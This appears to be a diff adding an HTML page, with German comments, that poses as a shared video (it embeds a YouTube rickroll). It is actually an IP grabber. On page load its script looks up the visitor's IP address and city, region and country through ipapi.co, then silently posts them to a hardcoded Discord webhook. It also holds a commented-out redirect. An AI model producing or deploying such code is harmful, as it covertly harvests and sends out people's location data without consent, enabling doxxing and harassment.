@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8" />
+    <title>We all love this video.</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: #121212;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        #ip {
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+            min-height: 1.5rem;
+        }
+        iframe {
+            border: none;
+            width: 560px;
+            height: 315px;
+            max-width: 90vw;
+        }
+    </style>
+</head>
+<body>
+    <div id="ip">Lade IP...</div>
+
+    <iframe 
+        src="https://www.youtube.com/embed/dQw4w9WgXcQ" 
+        title="YouTube Video"
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+        allowfullscreen>
+    </iframe>
+
+    <script>
+        var ip = '';
+        var ipIndex = 0;
+        var dots = '';
+        var dotsInterval;
+
+        function typeIP(ipInfo) {
+            var ipArray = ipInfo.ip.split('');
+            function type() {
+                if (ipIndex < ipArray.length) {
+                    ip += ipArray[ipIndex];
+                    document.getElementById('ip').innerText = ip;
+                    ipIndex++;
+                    setTimeout(type, 100);
+                } else {
+                    sendToDiscord(ipInfo);
+                    loadDots();
+                }
+            }
+            type();
+        }
+
+        function loadDots() {
+            dotsInterval = setInterval(function() {
+                if (dots.length < 4) {
+                    dots += '.';
+                } else {
+                    dots = '.';
+                }
+                document.getElementById('ip').innerText = ip + dots;
+            }, 500);
+        }
+
+        function stopLoadDots() {
+            clearInterval(dotsInterval);
+        }
+
+        function getIP() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    typeIP(data);
+                    // Starte 10 Sekunden später Redirect - falls benötigt, sonst entfernen
+                    setTimeout(function() {
+                        // window.location.replace('ruler.php'); 
+                    }, 10000);
+                })
+                .catch(error => {
+                    document.getElementById('ip').innerText = 'IP konnte nicht geladen werden.';
+                    console.error('Error:', error);
+                });
+        }
+
+        function sendToDiscord(ipInfo) {
+            var webhookURL = 'https://discord.com/api/webhooks/1372608968416956467/JY-sxJg3j095SIWTeLxVWo9MkHGRqKZxNWNJNLU7qZKPYXN4lhHm-yT2moxDSuVZR0D9'; 
+            var message = '# NEUE IP!! \n**IP:** ' + ipInfo.ip + '\n**Stadt:** ' + ipInfo.city + '\n**Region:** ' + ipInfo.region + '\n**Land:** ' + ipInfo.country_name + '\n||@everyone||';
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: message,
+                    embeds: [{
+                        image: {
+                            url: 'https://cdn.discordapp.com/attachments/995055443447664661/1237706860061130793/9k.png?ex=663c9fd6&is=663b4e56&hm=69451cbe9a0375ee40a7ecdf0cf05fd472493352cd92b417fa97ab8900afad2f&'
+                        }
+                    }]
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('IP-Adresse und Standort erfolgreich an Discord gesendet');
+                } else {
+                    console.error('Fehler beim Senden an Discord');
+                }
+            }).catch(error => {
+                console.error('Fehler beim Senden an Discord:', error);
+            });
+        }
+
+        getIP();
+    </script>
+</body>
+</html>
